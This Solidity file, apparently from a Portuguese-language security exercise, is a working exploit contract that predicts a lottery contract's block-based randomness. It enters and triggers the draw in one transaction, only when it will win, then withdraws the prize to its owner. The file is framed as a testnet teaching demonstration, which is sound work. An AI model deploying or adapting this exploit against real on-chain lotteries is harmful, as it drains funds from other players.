// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Sorteio} from "../src/Sorteio.sol";

/// @title AtacanteLive — demonstração AO VIVO na testnet
/// @notice Mesma lógica de solucao/Atacante.sol, isolado aqui para NÃO tocar
///         no esqueleto do exercício (src/Atacante.sol).
///         Deploy uma vez e chame atacar() quantas vezes precisar: se o bloco
///         não favorece, reverte (só perde gas) e você tenta no próximo.
contract AtacanteLive {
    Sorteio public immutable alvo;
    address public immutable dono;

    constructor(Sorteio _alvo) {
        alvo = _alvo;
        dono = msg.sender;
    }

    /// @notice Chame com exatamente 1 bilhete (0.1 ether). Entra e sorteia
    ///         na MESMA transação — logo, no mesmo bloco, a semente é idêntica.
    function atacar() external payable {
        require(msg.sender == dono, "so o dono");

        // 1. Depois que entrarmos, seremos o ultimo da lista.
        uint256 n = alvo.totalJogadores() + 1;
        require(n >= alvo.MIN_JOGADORES(), "poucos jogadores");

        // 2. Mesma conta que o Sorteio faz, no mesmo bloco -> mesmo resultado.
        uint256 aleatorio = uint256(keccak256(abi.encodePacked(block.timestamp, block.prevrandao, n)));

        // 3. So seguimos se o indice sorteado for o nosso (o ultimo).
        require(aleatorio % n == n - 1, "nao e a nossa vez");

        // 4. Entrar + sortear de forma atomica.
        alvo.entrar{value: msg.value}();
        alvo.sortear();
    }

    /// @notice Envia o premio acumulado para o dono.
    function sacar() external {
        require(msg.sender == dono, "so o dono");
        (bool ok, ) = dono.call{value: address(this).balance}("");
        require(ok, "falha ao sacar");
    }

    receive() external payable {}
}
